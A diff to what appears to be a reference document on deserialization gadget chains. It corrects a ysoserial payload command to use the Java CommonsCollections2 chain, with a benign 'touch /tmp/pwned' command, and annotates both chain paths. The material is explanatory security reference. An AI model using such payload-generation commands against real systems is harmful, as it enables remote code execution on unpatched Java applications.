@@ -48,10 +48,11 @@ POP chains exploit object-oriented programming semantics: by controlling which o
 | **Custom Application Gadgets** | Mining the application's own codebase for exploitable method chains, often through manual code review or automated analysis | Application classes with dangerous operations in magic methods |
 | **Cross-Library Composition** | Combining gadgets from multiple libraries — the initial trigger from library A chains into a sink in library B | Multiple libraries present simultaneously; no single library contains a complete chain |
 
-**Payload — Java Commons Collections (CC1 chain, ysoserial):**
+**Payload — Java Commons Collections (CC2 chain, ysoserial):**
 ```bash
-java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" | base64
+java -jar ysoserial.jar CommonsCollections2 "touch /tmp/pwned" | base64
 # Generates: PriorityQueue → TransformingComparator → InvokerTransformer → Runtime.exec()
+# CC1 chain uses AnnotationInvocationHandler → LazyMap → ChainedTransformer
 ```
 
 **Payload — PHP Laravel POP chain (PHPGGC):**
